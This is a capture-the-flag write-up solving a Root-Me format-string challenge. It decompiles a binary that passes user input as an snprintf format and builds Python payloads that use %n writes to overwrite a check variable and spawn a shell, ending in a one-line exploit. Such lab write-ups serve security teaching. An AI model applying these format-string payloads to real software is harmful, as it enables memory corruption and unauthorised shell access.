
###S0lv3d by H4yicl3

First I download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```

I use IDA to analysis the code .
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@6
  int v4; // edx@8
  int check; // [sp+28h] [bp-90h]@1
  int buf; // [sp+2Ch] [bp-8Ch]@3
  int stackcookie; // [sp+ACh] [bp-Ch]@1

  stackcookie = *MK_FP(__GS__, 20);
  check = 0x4030201;
  if ( argc <= 1 )
    exit(0);
  memset(&buf, 0, 0x80u);
  printf("check at 0x%x\n", &check); 		//not bug
  printf("argv[1] = [%s]\n", argv[1]);		//not bug
  snprintf((char *)&buf, 0x80u, argv[1]);
  if ( check != 0x4030201 && check != 0xDEADBEEF )
    puts("\nYou are on the right way !");
  printf("fmt=[%s]\n", &buf);			//not bug
  printf("check=0x%x\n", check);		//not bug 
  result = check;
  if ( check == 0xDEADBEEF )
  {
    puts("Yeah dude ! You win !");
    result = system("/bin/dash");
  }
  v4 = *MK_FP(__GS__, 20) ^ stackcookie;
  return result;
}
```
Try to understand the program you know!
The 4 line printf is safe !! but it give us more information like a vuln!
>The first we need to find the address of check
>Then we must modify it become 0xdeadbeef
>after we have controled /bin/dash
How can?
%n give us to midify the address we point in format string
%+offset+$+n give us modify specific position you know

try to read it maybe
chrome-extension://oemmndcbldboiebfnladdacbdfmadadm/https://www.exploit-db.com/docs/28476.pdf

Maybe next !!
the script i try 
```python
A="A"*4
padding ="%x_"*50
print A+padding
```
then i run this
```
python ch14.py >input
./ch14 `cat input`
check at 0xffffd648
argv[1] = [AAAA%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_]
fmt=[AAAAf7fd8b48_1_0_1_ffffd6e4_0_0_4030201_41414141_64663766_38346238_305f315f_665f315f_64666666_5f346536_5f305f30_30333034_5f3130]
check=0x4030201
```
>the first line you see the address of check (0xffffd648) you know !
>the third line you see the string"AAAA" i import at first then we see in fmt have the value 0x41414141 . it is the address we can insert !
>we can change "AAAA" become address of check ! you know ?
>and offset 0x41414141 is 9 ! we can count
>so we can use %+offset+$n to modified the check value !! maybe!

the script i change after is
```python
address="\x48\xd6\xff\xff"
padding ="%9$hn"
print address+padding
```
the result we get
```
./ch14 `cat input`
check at 0xffffd648
argv[1] = [H���%9$hn]

You are on the right way !
fmt=[H���]
check=0x4030004
```
we get "You are on the right way!"
So we just modified 0x40302010 become 0x4030004
that mean we just changed the 2 byte after
We want to change 2 byte before we need change 0xffffd648 become 0xffffd650
try to understand that with $n used to modify 2 byte so we need to add a address and modify 2byte next !! You know ?
>but we need to modify 0x4030004 be come 0x403beef before
0xbeef=48879 but we have 0004 so we need 48879-4 = 48875
```python
address="\x48\xd6\xff\xff"
padding ="%48875d%9$hn"  # add with % numberd (%48875d)
print address+padding
```
the result
```
./ch14 `cat input`
check at 0xffffd648
argv[1] = [H���%48875d%9$n]
You are on the right way !
fmt=[H���                                                                                                                         ]
check=0xbeef
```
we get 0xbeef 
so we add the 2 byte before by next python script
```python
address="\x38\xd6\xff\xff"
address2="\x3a\xd6\xff\xff"
padding ="%48875d%9$n"
padding +="%10$n"
print address + address2 + padding
```
>notice: i change address 0xffffd648 become 0xffffd638 .
because the result is
```
./ch14 `cat input`
check at 0xffffd638
argv[1] = [8���:���%48875d%9$n%10$n]

You are on the right way !
fmt=[]
check=0xbef3bef3
```
now the check is at 0xffffd638 !!
and we change check become 0xbef3bef3 ? 0xbeef ?
>ok we try get 48875-4 be cause we already add 1 address with 4 byte
>4 byte next is 0xdead !! 0xdead -0xbeef = 8126
the python script now look like
```python
address="\x38\xd6\xff\xff"
address2="\x3a\xd6\xff\xff"
padding ="%48871d%9$n"
padding +="%8126d%10$n"
print address + address2 + padding
```
>48875-4 =48871
>%8126d added
the result is 
```
./ch14 `cat input`
check at 0xffffd638
argv[1] = [8���:���%48871d%9$n%8126d%10$n]
fmt=[]
check=0xdeadbeef
Yeah dude ! You win !
$ 
```

Now we can  cat .passwd!! GLHF!

the following script in 1 line
```python
./ch14 $(python -c 'print "\x38\xfb\xff\xbf\x3a\xfb\xff\xbf"+"%48871d%9$n%8126d%10$n"')
check at 0xbffffb38
argv[1] = [x���z���%48871d%9$n%8126d%10$n]
fmt=[]
check=0xdeadbeef
Yeah dude ! You win !
$ 
```
